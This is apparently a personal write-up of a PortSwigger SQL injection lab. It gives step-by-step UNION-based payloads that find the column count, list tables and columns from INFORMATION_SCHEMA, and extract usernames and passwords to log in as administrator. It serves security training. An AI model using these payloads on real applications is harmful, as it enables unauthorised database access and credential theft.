# Lab: SQL injection attack, listing the database contents on non-Oracle databases
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

---

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

---

### My solution:

I checked how many columns the original query had by injecting this payload:
`/filter?category=NULL' ORDER BY 1--`
and incrementing `1` until I got an error
I got an error at `ORDER BY 3` so original query returns 2 columns

Now to find the name of the table containing the user information, I crafted and injected this payload:
`/filter?category=NULL' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES--`
This pulls all the table names from the schema, I also added NULL so it's 2 columns (Columns must be the same type and there needs to be the same number of columns when using UNION)

I found this table in the returned string:
<img width="532" height="304" alt="image" src="https://github.com/user-attachments/assets/b9b06d1c-2f48-49a9-9b2c-be0d1b0f14dd" />

And I tried to pull everything from that table but I got an error so I wanted to view all columns of that table
I did this by crafting and injecting this payload:
`/filter?category=NULL' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users_chvgwg'--`

It returned this:
<img width="183" height="125" alt="image" src="https://github.com/user-attachments/assets/80fd92f5-8f92-44c4-a3d7-621696a08cb7" />

Then I crafted and injected this payload to view the username and password of the admin user:
`/filter?category=NULL' UNION SELECT password_omirqd, username_lkcmyq from users_chvgwg--`

It returned:
<img width="242" height="216" alt="image" src="https://github.com/user-attachments/assets/1d72af97-eeb6-403d-a46d-b6a3cbefcbed" />

I finished the lab by logging in normally as the admin user.



